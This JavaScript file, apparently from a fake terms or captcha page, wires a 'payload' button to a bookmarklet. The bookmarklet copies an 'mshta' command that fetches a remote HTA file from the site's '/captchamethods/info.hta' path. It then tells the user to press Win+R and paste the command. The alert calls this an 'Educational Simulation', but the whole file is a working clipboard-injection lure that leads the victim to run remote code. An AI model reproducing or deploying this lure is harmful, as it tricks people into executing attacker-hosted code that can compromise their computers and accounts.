const terms = document.getElementById('terms');
const btnContainer = document.getElementById('btnContainer');
const payloadBtn = document.getElementById('payloadBtn');

const htaLink = window.location.origin + "/captchamethods/info.hta";
const code = `javascript:(function(){if(location.hostname.indexOf('google')===-1){alert('Run on google.com!');location.href='https://google.com';}else{alert('Account stolen! (Educational Simulation)');const t=document.createElement('textarea');t.value='mshta ${htaLink}';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);alert('Press Win+R and Ctrl+V to finish.');}})();`;

payloadBtn.href = code;

terms.addEventListener('change', () => {
    if(terms.checked) {
        btnContainer.classList.remove('locked');
    } else {
        btnContainer.classList.add('locked');
    }
});
